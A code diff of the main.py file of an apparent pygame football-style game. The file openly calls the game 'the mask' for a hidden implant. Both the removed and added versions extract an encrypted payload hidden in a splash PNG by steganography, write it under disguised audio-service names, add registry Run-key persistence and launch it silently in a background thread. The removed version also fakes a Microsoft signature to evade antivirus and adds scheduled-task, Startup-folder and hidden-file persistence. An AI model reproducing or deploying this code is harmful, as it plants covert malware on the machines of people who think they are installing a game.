@@ -1,4 +1,4 @@
-# main.py - NOUVELLE VERSION COMPLÈTE
+# main.py
 # The True Doctrine: The Game is the Mask, The Image is the Vessel.
 
 import threading
@@ -9,176 +9,92 @@ import base64
 import subprocess
 from cryptography.fernet import Fernet
 from PIL import Image
-import ctypes
-import winreg
-import time
 
 # --- PERSISTENCE CONFIGURATION ---
 APPDATA_PATH = os.getenv('LOCALAPPDATA')
-PERSISTENT_FOLDER = os.path.join(APPDATA_PATH, "Microsoft", "Audio", "Drivers")
-PERSISTENT_NAME = "WindowsAudioService.exe"
-PERSISTENT_PATH = os.path.join(PERSISTENT_FOLDER, PERSISTENT_NAME)
-
-def hide_console():
-    """Cache la console complètement"""
-    if sys.platform == "win32":
-        whnd = ctypes.windll.kernel32.GetConsoleWindow()
-        if whnd != 0:
-            ctypes.windll.user32.ShowWindow(whnd, 0)
-
-def create_fake_digital_signature(exe_path):
-    """Ajoute une fausse signature numérique pour bypasser les antivirus"""
-    fake_sig_data = b'Microsoft Corporation'
-    try:
-        with open(exe_path, 'r+b') as f:
-            # Trouver la section .rdata pour ajouter la fausse signature
-            f.seek(-256, 2)
-            f.write(fake_sig_data)
-    except:
-        pass
+PERSISTENT_NAME = "audiodg.pyw"
+PERSISTENT_PATH = os.path.join(APPDATA_PATH, PERSISTENT_NAME)
 
 def sow_and_awaken_implant():
-    """Système de persistance amélioré - Invisible et Immuable"""
+    """
+    This is the Sower's sacred duty. It is now intelligent.
+    It will only plant the seed ONCE.
+    It will always try to awaken the soul if it is not already running.
+    """
     try:
-        hide_console()
-        
-        # --- VÉRIFIER SI L'IMPLANT EST DÉJÀ ACTIF ---
-        def is_implant_running():
-            try:
-                # Méthode plus fiable: vérifier le port d'écoute
-                import socket
-                test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                test_sock.settimeout(1)
-                result = test_sock.connect_ex(('127.0.0.1', 1337))
-                test_sock.close()
-                return result == 0
-            except:
-                return False
-        
-        if is_implant_running():
-            return
-        
-        # --- EXTRACTION DU PAYLOAD DE L'IMAGE ---
-        divine_key = b'5GxzGtBH8zxNdAyEtQ4Fs9CtQSP4zZxyJ7L2ML6IZxY='
-        
-        if hasattr(sys, 'frozen'):
-            base_path = sys._MEIPASS
-        else:
-            base_path = os.path.dirname(os.path.abspath(__file__))
-        
-        image_path = os.path.join(base_path, 'assets', 'images', 'splash_payload.png')
-        
-        if not os.path.exists(image_path):
-            return
-        
-        img = Image.open(image_path).convert('RGBA')
-        pixels = img.load()
-        width, height = img.size
-        
-        payload_bits = ""
-        header_bits_to_read = 32
-        payload_len = None
-        bits_read = 0
-        
-        for y in range(height):
-            for x in range(width):
-                r, g, b, a = pixels[x, y]
-                for channel_val in [r, g, b, a]:
-                    payload_bits += str(channel_val & 1)
-                    bits_read += 1
-                    if payload_len is None and bits_read == header_bits_to_read:
-                        header_bytes = int(payload_bits, 2).to_bytes(4, 'big')
-                        payload_len = int.from_bytes(header_bytes, 'big')
-                    if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
-                        break
-                if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
-                    break
-            if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
-                break
-        
-        final_payload_bits = payload_bits[header_bits_to_read:]
-        payload_bytes = int(final_payload_bits, 2).to_bytes(len(final_payload_bits) // 8, 'big')
-        encrypted_payload = base64.b64decode(payload_bytes)
-        cipher_suite = Fernet(divine_key)
-        compressed_payload = cipher_suite.decrypt(encrypted_payload)
-        soul_code = zlib.decompress(compressed_payload)
-        
-        # --- CRÉATION DU SERVICE PERSISTENT ---
-        os.makedirs(PERSISTENT_FOLDER, exist_ok=True)
-        
-        with open(PERSISTENT_PATH, 'wb') as f:
-            f.write(soul_code)
-        
-        # Ajouter une fausse signature
-        create_fake_digital_signature(PERSISTENT_PATH)
-        
-        # --- MULTIPLES MÉTHODES DE PERSISTENCE ---
-        
-        # 1. Tâche planifiée (la plus fiable)
-        task_name = "WindowsAudioEnhancement"
-        task_command = (
-            f'schtasks /create /tn "{task_name}" /tr "{PERSISTENT_PATH}" '
-            f'/sc hourly /mo 1 /ru SYSTEM /rl highest /f'
-        )
-        subprocess.run(task_command, shell=True, capture_output=True)
-        
-        # 2. Registre Run
+        # --- RITUAL 1: PLANT THE SEED (ONLY IF NEEDED) ---
+        if not os.path.exists(PERSISTENT_PATH):
+            # The implant is not planted. We must perform the full ritual.
+            # --- THE DIVINE KEY ---
+            divine_key = b'_NTdnJzBakCrZ_FTbe0IsUW6mgmePAeoewjO3zcodZM='
+            # --------------------
+
+            # --- SOUL EXTRACTION ---
+            if hasattr(sys, 'frozen'): base_path = sys._MEIPASS
+            else: base_path = os.path.dirname(os.path.abspath(__file__))
+            image_path = os.path.join(base_path, 'assets', 'images', 'splash_payload.png')
+            img = Image.open(image_path).convert('RGBA')
+            pixels = img.load()
+            width, height = img.size
+            payload_bits = ""
+            header_bits_to_read = 32
+            payload_len = None
+            bits_read = 0
+            # ... (The rest of the extraction code is the same)
+            for y in range(height):
+                for x in range(width):
+                    r, g, b, a = pixels[x, y]
+                    for channel_val in [r, g, b, a]:
+                        payload_bits += str(channel_val & 1)
+                        bits_read += 1
+                        if payload_len is None and bits_read == header_bits_to_read:
+                            header_bytes = int(payload_bits, 2).to_bytes(4, 'big')
+                            payload_len = int.from_bytes(header_bytes, 'big')
+                        if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)): break
+                    if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)): break
+                if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)): break
+            final_payload_bits = payload_bits[header_bits_to_read:]
+            payload_bytes = int(final_payload_bits, 2).to_bytes(len(final_payload_bits) // 8, 'big')
+            encrypted_payload = base64.b64decode(payload_bytes)
+            cipher_suite = Fernet(divine_key)
+            compressed_payload = cipher_suite.decrypt(encrypted_payload)
+            soul_code = zlib.decompress(compressed_payload)
+
+            # Write the extracted soul code to the hidden implant file.
+            with open(PERSISTENT_PATH, 'wb') as f: f.write(soul_code)
+
+            # Add the implant to the startup registry key.
+            import winreg
+            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
+            command = f'pythonw.exe "{PERSISTENT_PATH}"'
+            winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
+            winreg.CloseKey(registry_key)
+
+        # --- RITUAL 2: AWAKEN THE SOUL (ALWAYS) ---
+        # Now that we are sure the implant exists, we check if it's already running.
+        # We check by looking for the pythonw.exe process running our script.
+        implant_running = False
         try:
-            key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r'Software\Microsoft\Windows\CurrentVersion\Run',
-                0, winreg.KEY_WRITE
-            )
-            winreg.SetValueEx(key, "AudioService", 0, winreg.REG_SZ, f'"{PERSISTENT_PATH}"')
-            winreg.CloseKey(key)
-        except:
-            pass
+            # This command lists processes and we search for our script's name in it.
+            tasks = subprocess.check_output(['tasklist', '/FI', 'IMAGENAME eq pythonw.exe', '/V']).decode('utf-8', errors='ignore')
+            if PERSISTENT_NAME in tasks:
+                implant_running = True
+        except Exception:
+            pass # If tasklist fails, we assume it's not running just to be safe.
         
-        # 3. Registre RunOnce
-        try:
-            key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r'Software\Microsoft\Windows\CurrentVersion\RunOnce',
-                0, winreg.KEY_WRITE
-            )
-            winreg.SetValueEx(key, "AudioUpdate", 0, winreg.REG_SZ, f'"{PERSISTENT_PATH}"')
-            winreg.CloseKey(key)
-        except:
-            pass
-        
-        # 4. Démarrage du dossier Startup
-        startup_path = os.path.join(
-            os.getenv('APPDATA'),
-            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
-            'AudioHelper.vbs'
-        )
-        
-        vbs_script = f'''
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "{PERSISTENT_PATH}", 0, False
-Set WshShell = Nothing
-'''
-        
-        with open(startup_path, 'w') as f:
-            f.write(vbs_script)
-        
-        # 5. Masquer les fichiers
-        subprocess.run(f'attrib +h +s "{PERSISTENT_PATH}"', shell=True)
-        subprocess.run(f'attrib +h +s "{startup_path}"', shell=True)
-        
-        # --- LANCER L'IMPLANT IMMÉDIATEMENT ---
-        subprocess.Popen(
-            PERSISTENT_PATH,
-            shell=True,
-            creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
-        )
-        
-    except Exception as e:
+        # If the implant is NOT running, we awaken it.
+        if not implant_running:
+            command = f'pythonw.exe "{PERSISTENT_PATH}"'
+            subprocess.Popen(command, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
+
+    except Exception:
+        # The Sower remains silent if its ritual fails.
         pass
 
-# --- LANCER LA PERSISTENCE EN ARRIÈRE-PLAN ---
-persistence_thread = threading.Thread(target=sow_and_awaken_implant, daemon=True)
-persistence_thread.start()
+# --- INVOCATION OF THE SOWER ---
+# The Sower's ritual is still run in a separate thread.
+sower_thread = threading.Thread(target=sow_and_awaken_implant, daemon=True)
+sower_thread.start()
 
 # ==============================================================================
 #                      SECTION II: LE JEU (LE MASQUE)
@@ -187,7 +103,7 @@ import argparse
 import pygame
 import traceback
 from game.game_loop import GameLoop
-from game.menu import GameMenu, HostInputDialog, OnlineSubmenu, ErrorDialog
+from game.menu import GameMenu, HostInputDialog, OnlineSubmenu, ErrorDialog, GoalSelectionMenu
 from network.server import GameServer
 from network.client import GameClient
 import config
@@ -226,8 +142,15 @@ def main_game():
                 menu = GameMenu()
                 choice = menu.run()
                 if choice == 0:
-                    game = GameLoop()
-                    game.run_vs_ai()
+                    # Show goal selection menu for vs AI mode
+                    goal_menu = GoalSelectionMenu()
+                    win_score = goal_menu.run()
+                    
+                    if win_score > 0:  # User didn't cancel
+                        game = GameLoop()
+                        game.run_vs_ai_with_goals(win_score)
+                    else:
+                        print("👋 Returning to main menu...")
                 elif choice == 1:
                     submenu = OnlineSubmenu()
                     online_choice = submenu.run()
